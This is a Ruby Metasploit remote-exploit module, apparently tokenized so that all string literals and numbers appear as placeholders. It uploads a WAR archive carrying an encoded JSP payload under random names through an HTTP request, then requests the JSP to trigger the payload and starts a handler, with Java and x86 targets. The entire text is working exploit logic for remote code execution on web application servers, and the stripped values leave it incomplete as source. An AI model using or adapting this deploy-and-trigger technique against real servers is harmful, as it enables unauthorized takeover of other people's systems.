require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking HttpFingerprint = { <str> = > [ <str> ] } include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: EXE def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > true , <str> = > <str> , <str> = > [ [ <str> , { <str> = > ARCH_JAVA , <str> = > <str> } , ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } , ] , [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } , ] , ] , <str> = > <int> , <str> = > <str> ) ) end def exploit app_base = rand_text_alphanumeric ( <int> + rand ( <int> - <int> ) ) jsp_name = rand_text_alphanumeric ( <int> + rand ( <int> ) ) war_data = payload . encoded_war ( <str> = > app_base , <str> = > jsp_name ) . to_s res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > war_data , <str> = > { <str> = > <str> , } , <str> = > false , <str> = > { <str> = > <str> app_base <str> } } ) print_status ( <str> war_data . length <str> app_base <str> ) select ( nil , nil , nil , <int> ) if ( res && res . code == <int> ) print_status ( <str> app_base <str> jsp_name <str> ) send_request_raw ( { <str> = > <str> app_base <str> + <str> jsp_name <str> + <str> , <str> = > <str> , } ) else print_error ( <str> ) end handler end end 
